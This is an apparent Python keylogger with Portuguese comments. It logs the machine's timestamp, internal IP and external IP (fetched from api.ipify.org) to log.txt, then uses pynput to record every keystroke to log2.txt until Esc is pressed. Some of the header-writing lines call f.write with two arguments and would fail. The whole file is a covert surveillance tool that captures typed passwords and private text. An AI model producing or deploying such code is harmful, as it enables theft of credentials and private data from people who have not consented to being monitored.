from pynput.keyboard import Listener
import time
import datetime
from requests import get
import subprocess
import socket

##########################################################################
# Timestamp para o arquivo de log
ts = time.time()
st = datetime.datetime.fromtimestamp(ts).strftime('%Y-%m-%d %H:%M:%S')

##########################################################################
# Script de acesso ao IPv4 da maquina
senha = []
meta_data = subprocess.check_output(["ipconfig"])
data = (str(meta_data)).split('\\r\\n')

for line in data:
    ip = (str(line).split('\\r\\n'))
    info = ip[0]
    senha.append(info[52:])

senha = list(filter(None,senha))
ip_interno = senha[15]

# Script de acesso de redundancia..
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.connect(("8.8.8.8", 80))
ip_interno_backup = (s.getsockname()[0])
s.close()

##########################################################################
# Script de acesso ao ip externo da maquina
ip_externo = get('https://api.ipify.org').text

##########################################################################
# Escrita do header do arquivo de log
with open("log.txt", 'a') as f:
        f.write('\n')
        f.write("Timestamp: "+ st)
        f.write('\n')
        f.write("IP Externo: ", ip_externo)
        f.write('\n')
        f.write("IP Interno: ", ip_interno)
        f.write('\n')
        f.write("IP Interno (socket): ", ip_interno_backup)
        f.write('\n\n')

##########################################################################
# Função de Listener
def log_keystroke(key):
    key = str(key).replace("'", "")
    if key == "Key.space":
        key = ' '
    if key == "Key.enter":
        key = '\n'
    if key == "Key.tab":
        key = '\t'
    if key == "Key.shift_r" or key == "Key.shift_l" or key == "Key.shift":
        return

    # Desliga o listener
    if key == "Key.esc":
        return False

    with open("log2.txt", 'a') as f:
        f.write(key)

with Listener(on_press=log_keystroke) as l:
    l.join()